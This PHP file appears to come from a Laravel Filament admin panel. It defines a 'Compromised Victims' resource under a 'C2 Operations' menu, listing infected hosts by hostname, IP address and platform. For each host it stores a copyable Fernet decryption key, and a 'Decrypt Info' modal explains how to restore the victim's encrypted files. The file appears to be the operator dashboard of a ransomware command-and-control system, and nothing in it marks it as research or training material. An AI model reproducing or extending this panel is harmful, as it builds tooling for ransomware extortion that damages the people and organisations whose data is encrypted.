<?php

namespace App\Filament\Resources;

use App\Filament\Resources\VictimResource\Pages;
use App\Models\Victim;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Table;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Actions\Action;

class VictimResource extends Resource
{
    protected static ?string $model = Victim::class;

    protected static ?string $navigationIcon = 'heroicon-o-users';

    protected static ?string $navigationLabel = 'Compromised Victims';

    protected static ?string $navigationGroup = 'C2 Operations';

    protected static ?int $navigationSort = 2;

    public static function table(Table $table): Table
    {
        return $table
            ->query(Victim::query())
            ->columns([
                TextColumn::make('hostname')
                    ->label('Target Hostname')
                    ->searchable()
                    ->weight('bold'),
                TextColumn::make('ip_address')
                    ->label('IP Address')
                    ->searchable(),
                TextColumn::make('os')
                    ->label('Platform')
                    ->badge(),
                TextColumn::make('encryption_key')
                    ->label('Fernet Decryption Key')
                    ->copyable()
                    ->copyMessage('Encryption key copied to clipboard')
                    ->copyMessageDuration(1500)
                    ->limit(20)
                    ->tooltip(fn (Victim $record): string => $record->encryption_key),
                TextColumn::make('status')
                    ->label('Status')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'compromised' => 'danger',
                        'resolved' => 'success',
                        default => 'gray',
                    }),
                TextColumn::make('updated_at')
                    ->label('Last Activity')
                    ->dateTime(),
            ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\EditAction::make(),
                Action::make('decrypt_help')
                    ->label('Decrypt Info')
                    ->icon('heroicon-o-key')
                    ->color('warning')
                    ->modalHeading('Decryption Instructions')
                    ->modalDescription('Use this key with the client decryption utility to restore target files.')
                    ->modalContent(fn (Victim $record) => view('filament.admin.modals.decrypt-key', ['record' => $record])),
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListVictims::route('/'),
            'create' => Pages\CreateVictim::route('/create'),
            'edit' => Pages\EditVictim::route('/edit/{record}'),
        ];
    }
}